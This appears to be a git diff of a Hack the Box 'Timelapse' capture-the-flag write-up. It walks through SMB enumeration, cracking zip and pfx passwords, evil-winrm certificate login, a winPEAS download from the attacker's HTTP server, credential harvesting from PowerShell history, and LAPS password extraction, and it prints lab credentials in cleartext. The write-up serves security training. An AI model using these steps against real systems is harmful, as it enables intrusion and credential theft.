@@ -4,13 +4,15 @@ title:  "Hack the Box - Timelapse"
 category: "Writeups"
 ---
 
-# NMAP
-## Commands
+## NMAP
+# Commands
+
 ```bash
 sudo nmap -sC -sV 10.10.11.152 -T4 -vv -oN scans/results.nmap
 ```
 
-## Results
+# Results
+
 ```bash
 PORT      STATE SERVICE           REASON          VERSION                                                                                                                                                                                  
 53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus                                                                                                                                                                          
@@ -28,8 +30,8 @@ PORT      STATE SERVICE           REASON          VERSION
 ```
 
 
-# SMB
-## Anonymous 
+## SMB
+# Anonymous 
 ```bash
 smbclient -L //10.10.11.152/ 
 
@@ -45,22 +47,28 @@ Sharename       Type      Comment
 ```
 
 
-## CME 
+# CME 
 - We had to install using docker
-### Docker process
+
+
+# Docker process
+This is a list of guides I used for using docker in this case
 - Get docker command from CME github
-- https://www.youtube.com/watch?v=QBOcKdh-fwQ
-- https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes
-- https://docs.docker.com/engine/reference/commandline/rename/
+- [YT Link](https://www.youtube.com/watch?v=QBOcKdh-fwQ)
+- [Guide](https://www.digitalocean.com/community/tutorials/how-to-remove-docker-images-containers-and-volumes)
+- [Docker docs](https://docs.docker.com/engine/reference/commandline/rename/)
+
 ```bash
 sudo docker run 6cc968e59baa smb 10.10.11.152 -u 'Anonymous' -p '' --shares
 ```
+
 - We see Anonymous can read the Shares and IPC$
 
 ## Shares Folder
 - We log in with smbclient
+
 ```bash
-smbclient -U 'Anonymous' //IP/Shares
+smbclient -U 'Anonymous' //<IP>/Shares
 ```
 
 - Two folders: Dev and HelpDesk
@@ -69,11 +77,11 @@ smbclient -U 'Anonymous' //IP/Shares
 - winrm_backup.zip
 
 ### HelpDesk
-- 3 docx
+- 3 docx(s)
 - Possible User: Jiri Formacek, Tom Ausburne
 - OperationGuide: Looks like random password but "7c3XlgsE"
 
-## WinRM_Backup.zip
+# WinRM_Backup.zip
 - Using zip2john, we can get the hash for the zip file
 
 ```bash
@@ -85,31 +93,35 @@ john hash.txt --wordlist=rockyou.txt
 ```
 - After cracking the hash, we get the password "supremelegacy" and we can unzip the folder now giving us the .pfx
 
-- We can install https://sourceforge.net/projects/crackpkcs12/ and https://github.com/crackpkcs12/crackpkcs12
+- We can install [Crackpkcs12](https://sourceforge.net/projects/crackpkcs12/) and/or [Crackpkcs12](https://github.com/crackpkcs12/crackpkcs12)
 - Now we can crack the pfx
 
 ```bash
 crackpkcs12 -b legacyy_dev_auth.pfx -M 15 -d rockyou.txt -v
 ```
-- Password : thuglegacy
+Password -> thuglegacy
 
-# Evil-WinRM over HTTPS
+## Evil-WinRM over HTTPS
+
 - [Check this link out](https://0xer3bus.gitbook.io/notes/windows/active-directory/winrm-using-certificate-pfx-.#for-linux)
-- Follow the steps below
-- Passphrase: turco123
+- Follow the steps below:
+- Passphrase I used: turco123
 - Now we can try to log in with evil-winrm and SSL
 
 ```bash
 sudo /home/turco/hacking-tools/evil-winrm/evil-winrm.rb -i timelapse.htb -S -k private.pem -c cert.crt -p ''
 ```
 - We are in as legacyy
-- ![[legacy-whoami.png]](/images/HTB/Timelapse/legacy-whoami.png)
+
+![[legacy-whoami.png]](/images/HTB/Timelapse/legacy-whoami.png)
 
 
-# Enumeration
-- whoami /all
+## Enumeration
 
-```windows
+```powershell-session
+whoami /all
+
+
 USER INFORMATION                                                                                                                                                                                                                           
 ----------------
 
@@ -154,9 +166,12 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 ```
 
-- whoami /groups
 
 ```windows
+
+whoami /groups
+
+
 Enter PEM pass phrase:
 
 GROUP INFORMATION
@@ -176,9 +191,10 @@ Authentication authority asserted identity  Well-known group S-1-18-1           
 Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 ```
 
-- whoami /privs
 
 ```windows
+whoami /privs
+
 Enter PEM pass phrase:
 
 PRIVILEGES INFORMATION
@@ -191,9 +207,12 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-- net localgroup
+
+
 
 ```windows
+net localgroup
+
 Enter PEM pass phrase:
 
 Aliases for \\DC01
@@ -236,25 +255,32 @@ The command completed successfully.
 
 ```
 
-# Winpeas
+## Winpeas
 [Upload x64 version onto machine](https://adamtheautomator.com/powershell-download-file/)
 
 ```windows
 Invoke-WebRequest -Uri 'http://10.10.14.7:8001/winPEASx64.exe' -OutFile 'C:\Users\legacyy\Documents\winPEAS.exe'
 ```
-## Output
-- PowerShell - C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+# Output
+- PowerShell Command History:
 
+```text
+C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
 
-- Folder: C:\windows\tasks
+- Folder: 
+
+```windows
+C:\windows\tasks
     FolderPerms: Authenticated Users [WriteData/CreateFiles]
    =================================================================================================
 
 
     Folder: C:\windows\system32\tasks
     FolderPerms: Authenticated Users [WriteData/CreateFiles]
+```	
 	
-	
+
 PowerShell History:
 ```
 whoami
@@ -268,9 +294,18 @@ SessionOption $so -scriptblock {whoami}
 get-aduser -filter * -properties *
 exit
 ```
-- Password: 'E3R$Q62^12p7PLlC%KWaxuaV'
-- Creds? svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
-- Could also search for certain strings, rather than winpeas:
+- Password: 
+```text
+'E3R$Q62^12p7PLlC%KWaxuaV'
+```
+
+- Possible Creds? 
+
+```text
+svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
+```
+- We could also search for certain strings, rather than winpeas:
+
 ```cmd
 findstr /si ConvertTo-SecureString
 ```
@@ -278,7 +313,7 @@ findstr /si ConvertTo-SecureString
 findstr /si Credential
 ```
 
-# SMB
+## SMB as svc_deploy
 ```bash
 sudo docker run 6cc968e59baa smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --shares
 
@@ -321,6 +356,7 @@ cat users.txt| cut -d'\' -f2- > newUsers.txt
 ```bash
 bloodhound-python -c All -u svc_deploy -d timelapse.htb -dc timelapse.htb -ns 10.10.11.152 --zip 
 ```
+
 ```bash
 sudo docker run -v ./bloohound-data -it bloodhound 
 ```
@@ -329,11 +365,17 @@ sudo docker run -v ./bloohound-data -it bloodhound
 
 ## Evil-WinRM
 - Doing basic enum again (groups, privs), we find the user is apart of the "LAPS_Reader" group
-- [Another resource about LAPS](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/you-might-want-to-audit-your-laps-permissions/ba-p/2280785)
+[Another resource about LAPS](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/you-might-want-to-audit-your-laps-permissions/ba-p/2280785)
+
 - Running the command in the service account session gives the Admin password and we can log in
-- Creds: ```"Administrator : 6;w9aKqtw@#ZH}6&@Uw69]iv"```
-- ![[svc_deploy_admin_pass.png]](/images/HTB/Timelapse/svc_deploy_admin_pass.png)
+Creds: 
+
+```text
+Administrator : 6;w9aKqtw@#ZH}6&@Uw69]iv
+```
+
+![[svc_deploy_admin_pass.png]](/images/HTB/Timelapse/svc_deploy_admin_pass.png)
 - Other resource: [Check this out](https://www.hackingarticles.in/credential-dumpinglaps/)
 
-# ADMIN
-- ![[admin-proof.png]](/images/HTB/Timelapse/admin-proof.png)
+# Admin
+![[admin-proof.png]](/images/HTB/Timelapse/admin-proof.png)
